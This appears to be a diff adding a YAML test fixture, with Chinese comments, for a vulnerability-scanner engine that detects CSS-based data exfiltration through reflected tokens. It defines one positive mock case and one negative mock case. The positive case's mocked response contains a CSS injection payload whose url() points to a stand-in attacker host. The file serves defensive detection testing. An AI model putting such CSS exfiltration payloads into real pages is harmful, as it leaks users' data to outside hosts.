@@ -1,0 +1,29 @@
+# CssExfiltrationEngine fixture：CSS 外泄（CSS 值上下文反射）探测引擎正反例。
+# check() 参数级：注入唯一 12 位 Token 的 CSS 值载荷（style 属性 url() 上下文），
+# 仅当 Token 回显进真实 CSS 值上下文（style 属性 / url() / <style> 块）且基线无时才判定。
+# 普通 HTML 文本回显（非 CSS 上下文）绝不误报（低误报铁律）。
+# evidence_contains / reproduction 为深度统计口径字段（组 E 统计脚本读取）。
+module: vulnclaw.engines.web_advanced_engines
+class: CssExfiltrationEngine
+engine: css_exfiltration
+
+cases:
+  - id: style_attr_reflected_token
+    expect: positive
+    target: https://127.0.0.1:8080/
+    responses:
+      /search:
+        status: 200
+        body: "<div style=\"background-image:url(https://x.attacker/TOKEN)\">x</div>"
+    evidence_contains: "CSS 外泄"
+    reproduction: "fixture 复现（离线 mock）：q 参数反射进 style 属性 url() 上下文 → 引擎产出 css_exfiltration 候选"
+
+  - id: plain_text_reflection_no_css_context
+    expect: negative
+    target: https://127.0.0.1:8080/
+    responses:
+      /search:
+        status: 200
+        body: "<div>TOKEN 只是普通文本回显</div>"
+    evidence_contains: ""
+    reproduction: ""
